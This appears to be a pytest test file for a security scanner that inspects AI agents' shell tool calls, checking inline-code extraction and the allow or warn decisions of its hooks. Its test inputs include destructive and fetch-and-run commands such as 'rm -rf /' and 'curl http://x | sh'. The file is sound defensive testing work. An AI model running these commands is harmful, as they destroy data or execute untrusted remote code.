import json
import subprocess
import sys

import pytest  # noqa: F401  (used by pytest parametrize, keep for linting)
from agent_sec_cli.code_scanner.hook_adapter.cosh.extractors import (
    extract_code_and_language,
)
from agent_sec_cli.code_scanner.hook_adapter.openclaw.extractors import (
    extract_code_and_language as oc_extract_code_and_language,
)
from agent_sec_cli.code_scanner.hook_adapter.utils.code_extractor import (
    extract_inline_code,
)
from agent_sec_cli.code_scanner.models import Language

# ---------------------------------------------------------------------------
# Tests for utils/code_extractor.py
# ---------------------------------------------------------------------------


class TestExtractInlineCode:
    """Tests for the generic extract_inline_code utility."""

    def test_bash_c(self) -> None:
        result = extract_inline_code('bash -c "rm -rf /"')
        assert result is not None
        code, lang = result
        assert code == "rm -rf /"
        assert lang == Language.BASH

    def test_sh_c(self) -> None:
        result = extract_inline_code('sh -c "curl http://x | sh"')
        assert result is not None
        code, lang = result
        assert "curl" in code
        assert lang == Language.BASH

    def test_zsh_c(self) -> None:
        result = extract_inline_code('zsh -c "echo hello"')
        assert result is not None
        _, lang = result
        assert lang == Language.BASH

    def test_python_c(self) -> None:
        result = extract_inline_code("python -c \"import os; os.system('rm -rf /')\"")
        assert result is not None
        code, lang = result
        assert "import os" in code
        assert lang == Language.PYTHON

    def test_python3_c(self) -> None:
        result = extract_inline_code('python3 -c "print(1)"')
        assert result is not None
        code, lang = result
        assert code == "print(1)"
        assert lang == Language.PYTHON

    def test_uv_run_python(self) -> None:
        result = extract_inline_code("uv run python -c \"os.system('x')\"")
        assert result is not None
        _, lang = result
        assert lang == Language.PYTHON

    def test_uv_run_with_flag_python3(self) -> None:
        result = extract_inline_code('uv run --with pkg python3 -c "print(2)"')
        assert result is not None
        code, lang = result
        assert code == "print(2)"
        assert lang == Language.PYTHON

    def test_uv_run_multiple_with_flags(self) -> None:
        """uv run with multiple --with flags should still match."""
        result = extract_inline_code(
            'uv run --with pkg1 --with pkg2 python3 -c "print(3)"'
        )
        assert result is not None
        code, lang = result
        assert code == "print(3)"
        assert lang == Language.PYTHON

    def test_uv_run_bash(self) -> None:
        """uv run wrapping a shell interpreter should also match."""
        result = extract_inline_code('uv run bash -c "echo hello"')
        assert result is not None
        code, lang = result
        assert code == "echo hello"
        assert lang == Language.BASH

    def test_no_match(self) -> None:
        result = extract_inline_code("ls -la /home")
        assert result is None

    def test_single_quotes(self) -> None:
        result = extract_inline_code("bash -c 'echo hi'")
        assert result is not None
        code, lang = result
        assert code == "echo hi"
        assert lang == Language.BASH

    def test_empty_string(self) -> None:
        assert extract_inline_code("") is None

    def test_uv_run_without_interpreter(self) -> None:
        """Bare `uv run script.py` has no `-c` inline code — no match."""
        assert extract_inline_code("uv run script.py") is None

    def test_missing_c_flag(self) -> None:
        """Interpreter without -c flag should not match."""
        assert extract_inline_code('python "print(1)"') is None

    def test_interpreter_mid_command(self) -> None:
        """Interpreter appearing after other tokens should still match."""
        result = extract_inline_code('sudo bash -c "whoami"')
        assert result is not None
        code, lang = result
        assert code == "whoami"
        assert lang == Language.BASH


# ---------------------------------------------------------------------------
# Tests for cosh/extractors.py
# ---------------------------------------------------------------------------


class TestCoshExtractors:
    """Tests for the cosh-specific extract_code_and_language function."""

    def test_run_shell_command(self) -> None:
        code, lang = extract_code_and_language(
            "run_shell_command", {"command": "rm -rf /tmp"}
        )
        assert code == "rm -rf /tmp"
        assert lang == Language.BASH

    def test_unknown_tool(self) -> None:
        code, lang = extract_code_and_language("unknown_tool", {"command": "something"})
        assert code is None
        assert lang is None

    def test_empty_field(self) -> None:
        code, lang = extract_code_and_language("run_shell_command", {"command": ""})
        assert code is None
        assert lang is None

    def test_deep_extract_python_in_shell(self) -> None:
        """A shell tool containing `python -c '...'` should extract python code."""
        code, lang = extract_code_and_language(
            "run_shell_command", {"command": 'python3 -c "import os"'}
        )
        assert code == "import os"
        assert lang == Language.PYTHON

    def test_shell_command_stays_bash(self) -> None:
        """A plain shell command without inline code should stay Language.BASH."""
        code, lang = extract_code_and_language(
            "run_shell_command", {"command": "ls -la /home"}
        )
        assert code == "ls -la /home"
        assert lang == Language.BASH


# ---------------------------------------------------------------------------
# Tests for openclaw/extractors.py
# ---------------------------------------------------------------------------


class TestOpenClawExtractors:
    """Tests for the OpenClaw-specific extract_code_and_language function."""

    def test_exec_tool(self) -> None:
        code, lang = oc_extract_code_and_language("exec", {"command": "rm -rf /tmp"})
        assert code == "rm -rf /tmp"
        assert lang == Language.BASH

    def test_unknown_tool(self) -> None:
        code, lang = oc_extract_code_and_language("web_search", {"query": "something"})
        assert code is None
        assert lang is None

    def test_empty_command(self) -> None:
        code, lang = oc_extract_code_and_language("exec", {"command": ""})
        assert code is None
        assert lang is None

    def test_deep_extract_python_in_exec(self) -> None:
        """An exec call containing `python -c '...'` should extract python code."""
        code, lang = oc_extract_code_and_language(
            "exec", {"command": 'python3 -c "import os"'}
        )
        assert code == "import os"
        assert lang == Language.PYTHON

    def test_plain_shell_stays_bash(self) -> None:
        code, lang = oc_extract_code_and_language("exec", {"command": "ls -la /home"})
        assert code == "ls -la /home"
        assert lang == Language.BASH

    def test_cosh_tool_not_recognized(self) -> None:
        """cosh tool names should NOT match OpenClaw extractors."""
        code, lang = oc_extract_code_and_language(
            "run_shell_command", {"command": "echo hi"}
        )
        assert code is None
        assert lang is None


# ---------------------------------------------------------------------------
# Tests for cosh/hook.py (integration via subprocess)
# ---------------------------------------------------------------------------


class TestCoshHook:
    """Integration tests: pipe JSON into `agent-sec-cli code-scan --mode cosh` and verify stdout JSON."""

    def _run_hook(self, input_data: dict) -> dict:
        proc = subprocess.run(
            [sys.executable, "-m", "agent_sec_cli.cli", "code-scan", "--mode", "cosh"],
            input=json.dumps(input_data),
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert proc.returncode == 0, f"CLI stderr: {proc.stderr}"
        return json.loads(proc.stdout)

    def test_allow_safe_command(self) -> None:
        output = self._run_hook(
            {
                "tool_name": "run_shell_command",
                "tool_input": {"command": "echo hello"},
            }
        )
        assert output["decision"] == "allow"
        assert "systemMessage" not in output

    def test_warn_dangerous_command(self) -> None:
        output = self._run_hook(
            {
                "tool_name": "run_shell_command",
                "tool_input": {"command": "rm -rf /tmp/x"},
            }
        )
        assert output["decision"] == "allow"
        assert "systemMessage" in output
        assert "code-scanner" in output["systemMessage"]

    def test_unknown_tool_allows(self) -> None:
        output = self._run_hook(
            {
                "tool_name": "unknown_tool",
                "tool_input": {"command": "rm -rf /"},
            }
        )
        assert output["decision"] == "allow"

    def test_invalid_json_allows(self) -> None:
        """Malformed stdin should fail-open with allow."""
        proc = subprocess.run(
            [sys.executable, "-m", "agent_sec_cli.cli", "code-scan", "--mode", "cosh"],
            input="not-json",
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert proc.returncode == 0
        output = json.loads(proc.stdout)
        assert output["decision"] == "allow"


# ---------------------------------------------------------------------------
# Tests for openclaw hook via CLI (integration via subprocess)
# ---------------------------------------------------------------------------


class TestOpenClawHook:
    """Integration tests: pipe JSON into `agent-sec-cli code-scan --mode openclaw` and verify stdout JSON."""

    def _run_hook(self, input_data: dict) -> dict:
        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "agent_sec_cli.cli",
                "code-scan",
                "--mode",
                "openclaw",
            ],
            input=json.dumps(input_data),
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert proc.returncode == 0, f"CLI stderr: {proc.stderr}"
        return json.loads(proc.stdout)

    def test_allow_safe_command(self) -> None:
        output = self._run_hook(
            {
                "tool_name": "exec",
                "tool_input": {"command": "echo hello"},
            }
        )
        assert output["skip"] is False
        assert "skipReason" not in output

    def test_warn_dangerous_command(self) -> None:
        output = self._run_hook(
            {
                "tool_name": "exec",
                "tool_input": {"command": "rm -rf /tmp/x"},
            }
        )
        assert output["skip"] is False
        assert "skipReason" in output
        assert "code-scanner" in output["skipReason"]

    def test_unknown_tool_allows(self) -> None:
        output = self._run_hook(
            {
                "tool_name": "web_search",
                "tool_input": {"query": "something"},
            }
        )
        assert output["skip"] is False

    def test_invalid_json_allows(self) -> None:
        """Malformed stdin should fail-open with skip=false."""
        proc = subprocess.run(
            [
                sys.executable,
                "-m",
                "agent_sec_cli.cli",
                "code-scan",
                "--mode",
                "openclaw",
            ],
            input="not-json",
            capture_output=True,
            text=True,
            timeout=15,
        )
        assert proc.returncode == 0
        output = json.loads(proc.stdout)
        assert output["skip"] is False
